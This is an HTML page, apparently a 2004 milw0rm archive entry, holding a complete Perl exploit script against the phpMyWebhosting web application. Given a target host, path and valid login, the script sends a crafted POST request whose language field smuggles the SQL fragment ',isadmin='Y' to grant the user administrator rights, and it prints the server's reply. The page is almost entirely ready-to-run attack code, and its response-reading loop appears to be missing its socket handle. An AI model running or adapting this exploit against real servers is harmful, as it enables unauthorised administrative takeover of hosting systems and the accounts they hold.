<html><head><title>phpMyWebhosting SQL Injection Exploit
</title></head><pre>#!/usr/bin/perl
# Exploit code by Noam Rathaus of Beyond Security Ltd.
# The following exploit code will use a valid username and password 
combination, to cause an SQL injection.
# Using the SQL injection, the Perl script elevates the privileges of the 
user provided to administrative.

use IO::Socket;
use strict;

my $Host = shift;
my $Path = shift;
my $Username = shift;
my $Password = shift;

if ($Host eq &quot;&quot; || $Path eq &quot;&quot; || $Username eq &quot;&quot; || $Password eq &quot;&quot;)
{
print &quot;You must run the script with the following syntax:\n&quot;;
print $0.&quot; hostname path username password\n&quot;;
exit(0);
}

my $remote = IO::Socket::INET-&gt;new (  Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; $Host, 
PeerPort =&gt; &quot;80&quot; );

unless ($remote) { die &quot;cannot connect to http daemon on $Host&quot; }

print &quot;connected\n&quot;;

$remote-&gt;autoflush(1);

my $http = &quot;POST /$Path/index.php HTTP/1.1
Host: $Host
User-Agent: Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.6) Gecko/20040506 
Firefox/0.8
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: &quot;;

my $content = 
&quot;PHP_AUTH_USER=$Username&amp;password=$Password&amp;language=english',isadmin='Y&amp;login=Login&quot;;

$http .= length($content).&quot;

$content&quot;;

print &quot;HTTP: [$http]\n&quot;;
print $remote $http;
sleep(1);
print &quot;Sent\n&quot;;

while ()
{
print $_;
}
print &quot;\n&quot;;

close $remote;


# milw0rm.com [2004-08-20]</pre></html>